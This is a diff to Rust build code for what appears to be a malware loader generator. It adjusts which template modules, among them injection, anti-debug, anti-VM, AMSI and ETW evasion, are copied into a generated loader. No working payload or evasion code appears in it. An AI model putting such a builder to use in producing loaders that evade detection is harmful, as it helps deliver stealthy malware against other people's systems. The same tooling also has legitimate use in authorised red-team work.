@@ -41,16 +41,6 @@ pub const TEMPLATE_MODULES: &[TemplateModule] = &[
         dest_file: "./loader/src/execution/injection.rs",
     },
     TemplateModule {
-        name: "utilities_mod",
-        source_file: "./template/utilities/mod.rs",
-        dest_file: "./loader/src/utilities/mod.rs",
-    },
-    TemplateModule {
-        name: "utilities_utils",
-        source_file: "./template/utilities/utils.rs",
-        dest_file: "./loader/src/utilities/utils.rs",
-    },
-    TemplateModule {
         name: "checks_mod",
         source_file: "./template/checks/mod.rs",
         dest_file: "./loader/src/checks/mod.rs",
@@ -94,6 +84,11 @@ pub const TEMPLATE_MODULES: &[TemplateModule] = &[
         name: "evasion_etw",
         source_file: "./template/evasion/etw.rs",
         dest_file: "./loader/src/evasion/etw.rs",
+    },
+    TemplateModule {
+        name: "evasion_misc",
+        source_file: "./template/evasion/misc.rs",
+        dest_file: "./loader/src/evasion/misc.rs",
     },
     TemplateModule {
         name: "benign",
@@ -152,7 +147,6 @@ pub fn setup_loader_directory() -> Result<(), std::io::Error> {
     std::fs::create_dir_all("loader")?;
     std::fs::create_dir_all("loader/src")?;
     std::fs::create_dir_all("loader/src/execution")?;
-    std::fs::create_dir_all("loader/src/utilities")?;
     std::fs::create_dir_all("loader/src/checks")?;
     std::fs::create_dir_all("loader/src/evasion")?;
     
@@ -185,9 +179,8 @@ fn should_include_module(module_name: &str, config: &PackerConfig) -> bool {
         "benign" => true,
         "aes" => config.encrypt.is_some(),
         "crypto" | "args" => config.encrypt.is_some(),
-        "utilities_mod" | "utilities_utils" => !config.utils.is_empty(),
         "checks_mod" | "checks_antidebug" | "checks_antivm" | "checks_misc" | "checks_wrapper" | "checks_peb" => !config.checks.is_empty(),
-        "evasion_mod" | "evasion_amsi" | "evasion_etw" => !config.evasion.is_empty(),
+        "evasion_mod" | "evasion_amsi" | "evasion_etw" | "evasion_misc" => !config.evasion.is_empty(),
         _ => false,
     }
 }
